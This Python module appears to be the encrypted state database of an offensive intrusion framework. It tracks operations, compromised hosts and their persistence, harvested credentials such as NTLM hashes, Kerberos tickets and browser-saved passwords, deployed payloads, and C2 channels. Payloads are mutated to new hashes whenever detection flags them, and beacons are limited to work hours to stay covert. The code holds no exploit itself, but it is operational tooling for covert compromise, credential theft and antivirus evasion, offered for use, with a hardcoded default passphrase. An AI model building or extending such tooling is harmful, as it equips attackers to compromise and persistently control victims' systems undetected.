"""
Operations State Database — Persistent encrypted state store for multi-session operations.

Schema: operations, hosts, credentials, payloads, c2_channels, events.
Encryption: AES-256-CTR via PBKDF2(passphrase, salt=op_id, iterations=600000).
All credential values and endpoint configs stored encrypted at rest.
"""
import hashlib
import json
import os
import secrets
import sqlite3
import struct
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple


# ─── AES-256-CTR (stdlib only, no pycryptodome) ──────────────────────

def _pbkdf2_key(passphrase: str, salt: str, iterations: int = 600000) -> bytes:
    """Derive 256-bit key from passphrase via PBKDF2-HMAC-SHA256."""
    return hashlib.pbkdf2_hmac(
        'sha256',
        passphrase.encode('utf-8'),
        salt.encode('utf-8'),
        iterations,
        dklen=32,
    )


def _aes_sbox():
    """Generate AES S-box lookup table."""
    sbox = [0] * 256
    p, q = 1, 1
    while True:
        p = p ^ (p << 1) ^ (0x1b if p & 0x80 else 0)
        p &= 0xff
        q ^= q << 1
        q ^= q << 2
        q ^= q << 4
        q ^= 0x09 if q & 0x80 else 0
        q &= 0xff
        xformed = q ^ _rotl8(q, 1) ^ _rotl8(q, 2) ^ _rotl8(q, 3) ^ _rotl8(q, 4)
        sbox[p] = (xformed ^ 0x63) & 0xff
        if p == 1:
            break
    sbox[0] = 0x63
    return bytes(sbox)


def _rotl8(x, n):
    return ((x << n) | (x >> (8 - n))) & 0xff


# Pre-computed AES S-box
_SBOX = _aes_sbox()
_RCON = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]


def _aes_key_expand(key: bytes) -> list:
    """AES-256 key expansion → 15 round keys (each 16 bytes)."""
    nk = 8  # 256-bit = 8 words
    nr = 14
    w = [0] * (4 * (nr + 1))
    for i in range(nk):
        w[i] = struct.unpack('>I', key[4*i:4*i+4])[0]
    for i in range(nk, 4 * (nr + 1)):
        t = w[i - 1]
        if i % nk == 0:
            t = ((_SBOX[(t >> 16) & 0xff] << 24) |
                 (_SBOX[(t >> 8) & 0xff] << 16) |
                 (_SBOX[t & 0xff] << 8) |
                 _SBOX[(t >> 24) & 0xff])
            t ^= _RCON[i // nk - 1] << 24
        elif i % nk == 4:
            t = ((_SBOX[(t >> 24) & 0xff] << 24) |
                 (_SBOX[(t >> 16) & 0xff] << 16) |
                 (_SBOX[(t >> 8) & 0xff] << 8) |
                 _SBOX[t & 0xff])
        w[i] = w[i - nk] ^ t
    # Convert to 16-byte round keys
    round_keys = []
    for r in range(nr + 1):
        rk = b''
        for j in range(4):
            rk += struct.pack('>I', w[r * 4 + j])
        round_keys.append(rk)
    return round_keys


def _aes_encrypt_block(block: bytes, round_keys: list) -> bytes:
    """Encrypt single 16-byte block with AES-256."""
    state = bytearray(block)
    nr = len(round_keys) - 1

    # AddRoundKey
    rk = round_keys[0]
    for i in range(16):
        state[i] ^= rk[i]

    for r in range(1, nr):
        # SubBytes
        for i in range(16):
            state[i] = _SBOX[state[i]]
        # ShiftRows
        state[1], state[5], state[9], state[13] = state[5], state[9], state[13], state[1]
        state[2], state[6], state[10], state[14] = state[10], state[14], state[2], state[6]
        state[3], state[7], state[11], state[15] = state[15], state[3], state[7], state[11]
        # MixColumns
        for c in range(4):
            i = c * 4
            a = [state[i], state[i+1], state[i+2], state[i+3]]
            state[i]   = _gf_mul(2, a[0]) ^ _gf_mul(3, a[1]) ^ a[2] ^ a[3]
            state[i+1] = a[0] ^ _gf_mul(2, a[1]) ^ _gf_mul(3, a[2]) ^ a[3]
            state[i+2] = a[0] ^ a[1] ^ _gf_mul(2, a[2]) ^ _gf_mul(3, a[3])
            state[i+3] = _gf_mul(3, a[0]) ^ a[1] ^ a[2] ^ _gf_mul(2, a[3])
        # AddRoundKey
        rk = round_keys[r]
        for i in range(16):
            state[i] ^= rk[i]

    # Final round (no MixColumns)
    for i in range(16):
        state[i] = _SBOX[state[i]]
    state[1], state[5], state[9], state[13] = state[5], state[9], state[13], state[1]
    state[2], state[6], state[10], state[14] = state[10], state[14], state[2], state[6]
    state[3], state[7], state[11], state[15] = state[15], state[3], state[7], state[11]
    rk = round_keys[nr]
    for i in range(16):
        state[i] ^= rk[i]

    return bytes(state)


def _gf_mul(a, b):
    """Galois Field multiplication in GF(2^8)."""
    p = 0
    for _ in range(8):
        if b & 1:
            p ^= a
        hi = a & 0x80
        a = (a << 1) & 0xff
        if hi:
            a ^= 0x1b
        b >>= 1
    return p


def _incr_counter(ctr: bytearray):
    """Increment 128-bit counter (big-endian)."""
    for i in range(15, -1, -1):
        ctr[i] = (ctr[i] + 1) & 0xff
        if ctr[i] != 0:
            break


def aes256_ctr_encrypt(plaintext: bytes, key: bytes) -> bytes:
    """AES-256-CTR encrypt. Returns nonce(16) || ciphertext."""
    nonce = os.urandom(16)
    round_keys = _aes_key_expand(key)
    ctr = bytearray(nonce)
    out = bytearray()

    for offset in range(0, len(plaintext), 16):
        keystream = _aes_encrypt_block(bytes(ctr), round_keys)
        _incr_counter(ctr)
        chunk = plaintext[offset:offset + 16]
        for i in range(len(chunk)):
            out.append(chunk[i] ^ keystream[i])

    return nonce + bytes(out)


def aes256_ctr_decrypt(ciphertext: bytes, key: bytes) -> bytes:
    """AES-256-CTR decrypt. Input: nonce(16) || ciphertext."""
    nonce = ciphertext[:16]
    data = ciphertext[16:]
    round_keys = _aes_key_expand(key)
    ctr = bytearray(nonce)
    out = bytearray()

    for offset in range(0, len(data), 16):
        keystream = _aes_encrypt_block(bytes(ctr), round_keys)
        _incr_counter(ctr)
        chunk = data[offset:offset + 16]
        for i in range(len(chunk)):
            out.append(chunk[i] ^ keystream[i])

    return bytes(out)


# ─── Operations Database ─────────────────────────────────────────────

SCHEMA_SQL = """
CREATE TABLE IF NOT EXISTS operations (
    op_id TEXT PRIMARY KEY,
    name TEXT,
    status TEXT CHECK(status IN ('active','paused','completed','burned')),
    created_at REAL,
    last_heartbeat REAL,
    config_encrypted BLOB
);

CREATE TABLE IF NOT EXISTS hosts (
    host_id TEXT PRIMARY KEY,
    op_id TEXT REFERENCES operations(op_id),
    ip TEXT NOT NULL,
    hostname TEXT,
    os_fingerprint TEXT,
    arch TEXT,
    status TEXT CHECK(status IN ('discovered','credentials_found','compromised','persistent','burned','lost')),
    first_seen REAL,
    last_contact REAL,
    hardware_profile TEXT,
    network_interfaces TEXT,
    installed_software TEXT,
    persistence_layers TEXT,
    c2_channels TEXT
);

CREATE TABLE IF NOT EXISTS credentials (
    cred_id TEXT PRIMARY KEY,
    op_id TEXT REFERENCES operations(op_id),
    source_host_id TEXT REFERENCES hosts(host_id),
    cred_type TEXT CHECK(cred_type IN (
        'password','ntlm_hash','kerberos_tgt','kerberos_tgs',
        'ssh_key','certificate','api_key','oauth_token',
        'aws_access_key','azure_token','gcp_service_account',
        'cookie','jwt','saml_token','vpn_psk','wifi_psk',
        'browser_saved','keychain','dpapi_blob'
    )),
    username TEXT,
    domain TEXT,
    value_encrypted BLOB,
    source TEXT,
    tested_against TEXT,
    is_canary INTEGER DEFAULT 0,
    harvested_at REAL,
    expires_at REAL
);

CREATE TABLE IF NOT EXISTS payloads (
    payload_id TEXT PRIMARY KEY,
    op_id TEXT REFERENCES operations(op_id),
    target_host_id TEXT REFERENCES hosts(host_id),
    sha256 TEXT NOT NULL,
    sha256_previous TEXT,
    payload_type TEXT,
    mutation_generation INTEGER DEFAULT 0,
    next_mutation_at REAL,
    detection_status TEXT CHECK(detection_status IN ('clean','flagged','burned','replaced')),
    last_bazaar_check REAL,
    deployed_path TEXT,
    deployed_at REAL
);

CREATE TABLE IF NOT EXISTS c2_channels (
    channel_id TEXT PRIMARY KEY,
    op_id TEXT REFERENCES operations(op_id),
    channel_type TEXT CHECK(channel_type IN (
        'dns_over_https','https_beacon','email_covert',
        'steganography','blockchain','websocket','icmp_tunnel',
        'dns_txt','smb_named_pipe'
    )),
    priority INTEGER,
    status TEXT CHECK(status IN ('active','degraded','failed','burned')),
    endpoint_encrypted BLOB,
    last_successful REAL,
    bytes_sent INTEGER DEFAULT 0,
    bytes_received INTEGER DEFAULT 0,
    jitter_min_ms INTEGER,
    jitter_max_ms INTEGER,
    beacon_interval_seconds INTEGER,
    work_hours_only INTEGER DEFAULT 1
);

CREATE TABLE IF NOT EXISTS events (
    event_id INTEGER PRIMARY KEY AUTOINCREMENT,
    op_id TEXT REFERENCES operations(op_id),
    timestamp REAL NOT NULL,
    event_type TEXT NOT NULL,
    severity TEXT CHECK(severity IN ('info','warning','critical','emergency')),
    source_host_id TEXT,
    details TEXT,
    auto_action_taken TEXT
);

CREATE INDEX IF NOT EXISTS idx_hosts_status ON hosts(op_id, status);
CREATE INDEX IF NOT EXISTS idx_creds_type ON credentials(op_id, cred_type);
CREATE INDEX IF NOT EXISTS idx_payloads_detection ON payloads(op_id, detection_status);
CREATE INDEX IF NOT EXISTS idx_events_time ON events(op_id, timestamp);
CREATE INDEX IF NOT EXISTS idx_events_type ON events(op_id, event_type);
"""


class OperationsDB:
    """Encrypted operations state store backed by SQLite."""

    def __init__(self, db_path: str = None, passphrase: str = None):
        if db_path is None:
            db_path = str(Path(__file__).parent.parent / 'knowledge' / 'operations.db')
        self.db_path = db_path
        self.passphrase = passphrase or 'FORGE_DEFAULT_KEY'
        self._conn = None
        self._keys: Dict[str, bytes] = {}  # op_id → derived key

    def connect(self):
        """Open DB connection and ensure schema."""
        self._conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self._conn.row_factory = sqlite3.Row
        self._conn.execute("PRAGMA journal_mode=WAL")
        self._conn.execute("PRAGMA foreign_keys=ON")
        self._conn.executescript(SCHEMA_SQL)
        self._conn.commit()

    def close(self):
        if self._conn:
            self._conn.close()
            self._conn = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *args):
        self.close()

    def _get_key(self, op_id: str) -> bytes:
        """Get or derive encryption key for an operation."""
        if op_id not in self._keys:
            self._keys[op_id] = _pbkdf2_key(self.passphrase, op_id)
        return self._keys[op_id]

    def _encrypt(self, op_id: str, data: str) -> bytes:
        """Encrypt string data for storage."""
        key = self._get_key(op_id)
        return aes256_ctr_encrypt(data.encode('utf-8'), key)

    def _decrypt(self, op_id: str, blob: bytes) -> str:
        """Decrypt stored blob to string."""
        key = self._get_key(op_id)
        return aes256_ctr_decrypt(blob, key).decode('utf-8')

    # ─── Operations CRUD ──────────────────────────────────────────

    def create_operation(self, name: str, config: dict = None) -> str:
        """Create new operation, return op_id."""
        now = time.time()
        ts = time.strftime('%Y-%m%d-%H%M', time.localtime(now))
        op_id = f"OP-{ts}"

        config_enc = None
        if config:
            config_enc = self._encrypt(op_id, json.dumps(config))

        self._conn.execute(
            "INSERT INTO operations (op_id, name, status, created_at, last_heartbeat, config_encrypted) "
            "VALUES (?, ?, 'active', ?, ?, ?)",
            (op_id, name, now, now, config_enc)
        )
        self._conn.commit()

        self.log_event(op_id, 'operation_created', 'info',
                       details={'name': name})
        return op_id

    def get_operation(self, op_id: str) -> Optional[dict]:
        """Get operation by ID."""
        row = self._conn.execute(
            "SELECT * FROM operations WHERE op_id = ?", (op_id,)
        ).fetchone()
        if not row:
            return None
        d = dict(row)
        if d.get('config_encrypted'):
            try:
                d['config'] = json.loads(self._decrypt(op_id, d['config_encrypted']))
            except Exception:
                d['config'] = None
        return d

    def list_operations(self, status: str = None) -> List[dict]:
        """List all operations, optionally filtered by status."""
        if status:
            rows = self._conn.execute(
                "SELECT * FROM operations WHERE status = ? ORDER BY created_at DESC",
                (status,)
            ).fetchall()
        else:
            rows = self._conn.execute(
                "SELECT * FROM operations ORDER BY created_at DESC"
            ).fetchall()
        return [dict(r) for r in rows]

    def update_operation_status(self, op_id: str, status: str):
        """Update operation status."""
        self._conn.execute(
            "UPDATE operations SET status = ?, last_heartbeat = ? WHERE op_id = ?",
            (status, time.time(), op_id)
        )
        self._conn.commit()
        self.log_event(op_id, 'operation_status_change', 'info',
                       details={'new_status': status})

    def heartbeat(self, op_id: str):
        """Update last heartbeat timestamp."""
        self._conn.execute(
            "UPDATE operations SET last_heartbeat = ? WHERE op_id = ?",
            (time.time(), op_id)
        )
        self._conn.commit()

    # ─── Hosts CRUD ───────────────────────────────────────────────

    def add_host(self, op_id: str, ip: str, hostname: str = None,
                 os_fingerprint: str = None, arch: str = None) -> str:
        """Add discovered host, return host_id."""
        now = time.time()
        host_id = hashlib.sha256(f"{ip}{now}".encode()).hexdigest()[:16]

        self._conn.execute(
            "INSERT OR IGNORE INTO hosts "
            "(host_id, op_id, ip, hostname, os_fingerprint, arch, status, first_seen, last_contact) "
            "VALUES (?, ?, ?, ?, ?, ?, 'discovered', ?, ?)",
            (host_id, op_id, ip, hostname, os_fingerprint, arch, now, now)
        )
        self._conn.commit()

        self.log_event(op_id, 'host_discovered', 'info',
                       source_host_id=host_id,
                       details={'ip': ip, 'hostname': hostname})
        return host_id

    def get_host(self, host_id: str) -> Optional[dict]:
        row = self._conn.execute(
            "SELECT * FROM hosts WHERE host_id = ?", (host_id,)
        ).fetchone()
        if not row:
            return None
        d = dict(row)
        for json_field in ('hardware_profile', 'network_interfaces',
                           'installed_software', 'persistence_layers', 'c2_channels'):
            if d.get(json_field):
                try:
                    d[json_field] = json.loads(d[json_field])
                except (json.JSONDecodeError, TypeError):
                    pass
        return d

    def get_hosts(self, op_id: str, status: str = None) -> List[dict]:
        if status:
            rows = self._conn.execute(
                "SELECT * FROM hosts WHERE op_id = ? AND status = ?",
                (op_id, status)
            ).fetchall()
        else:
            rows = self._conn.execute(
                "SELECT * FROM hosts WHERE op_id = ?", (op_id,)
            ).fetchall()
        return [dict(r) for r in rows]

    def update_host_status(self, host_id: str, status: str):
        """Update host status with state machine validation."""
        valid_transitions = {
            'discovered': {'credentials_found', 'compromised', 'burned'},
            'credentials_found': {'compromised', 'burned'},
            'compromised': {'persistent', 'burned', 'lost'},
            'persistent': {'burned', 'lost', 'compromised'},  # auto-recovery
            'burned': set(),
            'lost': {'compromised', 'persistent'},  # auto-recovery
        }
        current = self._conn.execute(
            "SELECT status, op_id FROM hosts WHERE host_id = ?", (host_id,)
        ).fetchone()
        if not current:
            return

        current_status = current['status']
        if status not in valid_transitions.get(current_status, set()):
            return  # invalid transition, silently ignore

        self._conn.execute(
            "UPDATE hosts SET status = ?, last_contact = ? WHERE host_id = ?",
            (status, time.time(), host_id)
        )
        self._conn.commit()

        self.log_event(current['op_id'], 'host_status_change',
                       'warning' if status in ('burned', 'lost') else 'info',
                       source_host_id=host_id,
                       details={'from': current_status, 'to': status})

    def update_host_profile(self, host_id: str, **kwargs):
        """Update host fields (hardware_profile, network_interfaces, etc.)."""
        allowed = {'hardware_profile', 'network_interfaces', 'installed_software',
                   'persistence_layers', 'c2_channels', 'hostname', 'os_fingerprint', 'arch'}
        updates = []
        values = []
        for k, v in kwargs.items():
            if k not in allowed:
                continue
            if isinstance(v, (dict, list)):
                v = json.dumps(v)
            updates.append(f"{k} = ?")
            values.append(v)

        if not updates:
            return
        values.append(host_id)
        self._conn.execute(
            f"UPDATE hosts SET {', '.join(updates)} WHERE host_id = ?",
            values
        )
        self._conn.commit()

    # ─── Credentials CRUD ─────────────────────────────────────────

    def add_credential(self, op_id: str, cred_type: str, username: str = None,
                       domain: str = None, value: str = '', source: str = None,
                       source_host_id: str = None) -> str:
        """Add credential with encrypted value, return cred_id."""
        cred_id = secrets.token_hex(8)
        now = time.time()

        value_enc = self._encrypt(op_id, value)

        self._conn.execute(
            "INSERT INTO credentials "
            "(cred_id, op_id, source_host_id, cred_type, username, domain, "
            "value_encrypted, source, harvested_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
            (cred_id, op_id, source_host_id, cred_type, username, domain,
             value_enc, source, now)
        )
        self._conn.commit()

        self.log_event(op_id, 'credential_found',
                       'warning' if cred_type in ('ssh_key', 'aws_access_key', 'kerberos_tgt') else 'info',
                       source_host_id=source_host_id,
                       details={'cred_type': cred_type, 'username': username,
                                'domain': domain, 'source': source})
        return cred_id

    def get_credential(self, cred_id: str) -> Optional[dict]:
        row = self._conn.execute(
            "SELECT * FROM credentials WHERE cred_id = ?", (cred_id,)
        ).fetchone()
        if not row:
            return None
        d = dict(row)
        if d.get('value_encrypted') and d.get('op_id'):
            try:
                d['value'] = self._decrypt(d['op_id'], d['value_encrypted'])
            except Exception:
                d['value'] = None
        if d.get('tested_against'):
            try:
                d['tested_against'] = json.loads(d['tested_against'])
            except (json.JSONDecodeError, TypeError):
                pass
        return d

    def get_credentials(self, op_id: str, cred_type: str = None) -> List[dict]:
        if cred_type:
            rows = self._conn.execute(
                "SELECT cred_id, op_id, source_host_id, cred_type, username, domain, "
                "source, is_canary, harvested_at, expires_at "
                "FROM credentials WHERE op_id = ? AND cred_type = ?",
                (op_id, cred_type)
            ).fetchall()
        else:
            rows = self._conn.execute(
                "SELECT cred_id, op_id, source_host_id, cred_type, username, domain, "
                "source, is_canary, harvested_at, expires_at "
                "FROM credentials WHERE op_id = ?",
                (op_id,)
            ).fetchall()
        return [dict(r) for r in rows]

    def mark_canary(self, cred_id: str):
        """Mark credential as canary/honey token."""
        self._conn.execute(
            "UPDATE credentials SET is_canary = 1 WHERE cred_id = ?",
            (cred_id,)
        )
        self._conn.commit()

    def record_credential_test(self, cred_id: str, host_id: str,
                               service: str, result: str):
        """Record result of testing a credential against a host/service."""
        row = self._conn.execute(
            "SELECT tested_against FROM credentials WHERE cred_id = ?",
            (cred_id,)
        ).fetchone()
        if not row:
            return
        tests = json.loads(row['tested_against']) if row['tested_against'] else []
        tests.append({
            'host_id': host_id,
            'service': service,
            'result': result,
            'timestamp': time.time(),
        })
        self._conn.execute(
            "UPDATE credentials SET tested_against = ? WHERE cred_id = ?",
            (json.dumps(tests), cred_id)
        )
        self._conn.commit()

    # ─── Payloads CRUD ────────────────────────────────────────────

    def add_payload(self, op_id: str, target_host_id: str, sha256_hash: str,
                    payload_type: str, deployed_path: str = None) -> str:
        """Register deployed payload."""
        payload_id = secrets.token_hex(8)
        now = time.time()

        self._conn.execute(
            "INSERT INTO payloads "
            "(payload_id, op_id, target_host_id, sha256, payload_type, "
            "detection_status, deployed_path, deployed_at) "
            "VALUES (?, ?, ?, ?, ?, 'clean', ?, ?)",
            (payload_id, op_id, target_host_id, sha256_hash,
             payload_type, deployed_path, now)
        )
        self._conn.commit()
        return payload_id

    def get_payloads(self, op_id: str, detection_status: str = None) -> List[dict]:
        if detection_status:
            rows = self._conn.execute(
                "SELECT * FROM payloads WHERE op_id = ? AND detection_status = ?",
                (op_id, detection_status)
            ).fetchall()
        else:
            rows = self._conn.execute(
                "SELECT * FROM payloads WHERE op_id = ?", (op_id,)
            ).fetchall()
        return [dict(r) for r in rows]

    def get_all_payload_hashes(self, op_id: str) -> List[Tuple[str, str]]:
        """Return list of (payload_id, sha256) for hash monitoring."""
        rows = self._conn.execute(
            "SELECT payload_id, sha256 FROM payloads "
            "WHERE op_id = ? AND detection_status IN ('clean', 'flagged')",
            (op_id,)
        ).fetchall()
        return [(r['payload_id'], r['sha256']) for r in rows]

    def update_payload_status(self, payload_id: str, status: str,
                              auto_action: str = None):
        """Update payload detection status."""
        row = self._conn.execute(
            "SELECT op_id, sha256 FROM payloads WHERE payload_id = ?",
            (payload_id,)
        ).fetchone()
        if not row:
            return
        self._conn.execute(
            "UPDATE payloads SET detection_status = ? WHERE payload_id = ?",
            (status, payload_id)
        )
        self._conn.commit()

        severity = 'critical' if status in ('burned', 'flagged') else 'info'
        self.log_event(row['op_id'], 'payload_status_change', severity,
                       details={'payload_id': payload_id, 'status': status,
                                'sha256': row['sha256'],
                                'auto_action': auto_action})

    def record_mutation(self, payload_id: str, new_sha256: str,
                        next_mutation_at: float = None):
        """Record payload mutation (new hash)."""
        self._conn.execute(
            "UPDATE payloads SET "
            "sha256_previous = sha256, sha256 = ?, "
            "mutation_generation = mutation_generation + 1, "
            "next_mutation_at = ?, detection_status = 'clean' "
            "WHERE payload_id = ?",
            (new_sha256, next_mutation_at, payload_id)
        )
        self._conn.commit()

    # ─── C2 Channels CRUD ─────────────────────────────────────────

    def add_c2_channel(self, op_id: str, channel_type: str, priority: int,
                       endpoint: str, beacon_interval: int = 60,
                       jitter_min: int = 1000, jitter_max: int = 5000,
                       work_hours_only: bool = True) -> str:
        """Register C2 channel with encrypted endpoint."""
        channel_id = secrets.token_hex(8)
        endpoint_enc = self._encrypt(op_id, endpoint)

        self._conn.execute(
            "INSERT INTO c2_channels "
            "(channel_id, op_id, channel_type, priority, status, endpoint_encrypted, "
            "last_successful, jitter_min_ms, jitter_max_ms, beacon_interval_seconds, "
            "work_hours_only) "
            "VALUES (?, ?, ?, ?, 'active', ?, ?, ?, ?, ?, ?)",
            (channel_id, op_id, channel_type, priority, endpoint_enc,
             time.time(), jitter_min, jitter_max, beacon_interval,
             1 if work_hours_only else 0)
        )
        self._conn.commit()
        return channel_id

    def get_c2_channels(self, op_id: str, active_only: bool = True) -> List[dict]:
        if active_only:
            rows = self._conn.execute(
                "SELECT * FROM c2_channels WHERE op_id = ? AND status IN ('active','degraded') "
                "ORDER BY priority",
                (op_id,)
            ).fetchall()
        else:
            rows = self._conn.execute(
                "SELECT * FROM c2_channels WHERE op_id = ? ORDER BY priority",
                (op_id,)
            ).fetchall()
        results = []
        for r in rows:
            d = dict(r)
            if d.get('endpoint_encrypted'):
                try:
                    d['endpoint'] = self._decrypt(op_id, d['endpoint_encrypted'])
                except Exception:
                    d['endpoint'] = None
            results.append(d)
        return results

    def update_c2_status(self, channel_id: str, status: str):
        self._conn.execute(
            "UPDATE c2_channels SET status = ? WHERE channel_id = ?",
            (status, channel_id)
        )
        self._conn.commit()

    def record_c2_beacon(self, channel_id: str, bytes_sent: int = 0,
                         bytes_received: int = 0):
        """Record successful C2 beacon."""
        self._conn.execute(
            "UPDATE c2_channels SET "
            "last_successful = ?, "
            "bytes_sent = bytes_sent + ?, "
            "bytes_received = bytes_received + ? "
            "WHERE channel_id = ?",
            (time.time(), bytes_sent, bytes_received, channel_id)
        )
        self._conn.commit()

    # ─── Events ───────────────────────────────────────────────────

    def log_event(self, op_id: str, event_type: str, severity: str = 'info',
                  source_host_id: str = None, details: dict = None,
                  auto_action: str = None):
        """Log operation event."""
        self._conn.execute(
            "INSERT INTO events (op_id, timestamp, event_type, severity, "
            "source_host_id, details, auto_action_taken) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            (op_id, time.time(), event_type, severity,
             source_host_id,
             json.dumps(details) if details else None,
             auto_action)
        )
        self._conn.commit()

    def get_events(self, op_id: str, event_type: str = None,
                   severity: str = None, limit: int = 100) -> List[dict]:
        query = "SELECT * FROM events WHERE op_id = ?"
        params = [op_id]
        if event_type:
            query += " AND event_type = ?"
            params.append(event_type)
        if severity:
            query += " AND severity = ?"
            params.append(severity)
        query += " ORDER BY timestamp DESC LIMIT ?"
        params.append(limit)

        rows = self._conn.execute(query, params).fetchall()
        results = []
        for r in rows:
            d = dict(r)
            if d.get('details'):
                try:
                    d['details'] = json.loads(d['details'])
                except (json.JSONDecodeError, TypeError):
                    pass
            results.append(d)
        return results

    # ─── Status Summary ───────────────────────────────────────────

    def get_status_summary(self, op_id: str) -> dict:
        """Get operation status summary for --status command."""
        op = self.get_operation(op_id)
        if not op:
            return {'error': f'Operation {op_id} not found'}

        host_counts = {}
        for row in self._conn.execute(
            "SELECT status, COUNT(*) as cnt FROM hosts WHERE op_id = ? GROUP BY status",
            (op_id,)
        ):
            host_counts[row['status']] = row['cnt']

        cred_counts = {}
        for row in self._conn.execute(
            "SELECT cred_type, COUNT(*) as cnt FROM credentials WHERE op_id = ? GROUP BY cred_type",
            (op_id,)
        ):
            cred_counts[row['cred_type']] = row['cnt']

        payload_counts = {}
        for row in self._conn.execute(
            "SELECT detection_status, COUNT(*) as cnt FROM payloads WHERE op_id = ? GROUP BY detection_status",
            (op_id,)
        ):
            payload_counts[row['detection_status']] = row['cnt']

        c2_active = self._conn.execute(
            "SELECT COUNT(*) as cnt FROM c2_channels WHERE op_id = ? AND status = 'active'",
            (op_id,)
        ).fetchone()['cnt']

        recent_events = self.get_events(op_id, limit=10)

        uptime = time.time() - op['created_at'] if op.get('created_at') else 0

        return {
            'op_id': op_id,
            'name': op.get('name'),
            'status': op.get('status'),
            'uptime_hours': round(uptime / 3600, 1),
            'hosts': host_counts,
            'hosts_total': sum(host_counts.values()),
            'credentials': cred_counts,
            'credentials_total': sum(cred_counts.values()),
            'payloads': payload_counts,
            'payloads_total': sum(payload_counts.values()),
            'c2_channels_active': c2_active,
            'recent_events': recent_events,
        }

    def format_status(self, op_id: str) -> str:
        """Format status summary for terminal display."""
        s = self.get_status_summary(op_id)
        if 'error' in s:
            return s['error']

        lines = [
            f"\n{'='*60}",
            f"  OPERATION: {s['op_id']} — {s['name']}",
            f"  Status: {s['status'].upper()}  |  Uptime: {s['uptime_hours']}h",
            f"{'='*60}",
            f"",
            f"  HOSTS ({s['hosts_total']}):",
        ]
        for status, count in sorted(s['hosts'].items()):
            icon = {'compromised': '+', 'persistent': '*', 'burned': 'X',
                    'lost': '?', 'discovered': 'o', 'credentials_found': '~'}.get(status, ' ')
            lines.append(f"    [{icon}] {status}: {count}")

        lines.append(f"")
        lines.append(f"  CREDENTIALS ({s['credentials_total']}):")
        for ctype, count in sorted(s['credentials'].items()):
            lines.append(f"    {ctype}: {count}")

        lines.append(f"")
        lines.append(f"  PAYLOADS ({s['payloads_total']}):")
        for dstatus, count in sorted(s['payloads'].items()):
            lines.append(f"    {dstatus}: {count}")

        lines.append(f"")
        lines.append(f"  C2 CHANNELS: {s['c2_channels_active']} active")

        if s['recent_events']:
            lines.append(f"")
            lines.append(f"  RECENT EVENTS:")
            for evt in s['recent_events'][:5]:
                ts = time.strftime('%H:%M:%S', time.localtime(evt['timestamp']))
                lines.append(f"    [{ts}] {evt['severity'].upper()}: {evt['event_type']}")

        lines.append(f"{'='*60}")
        return '\n'.join(lines)
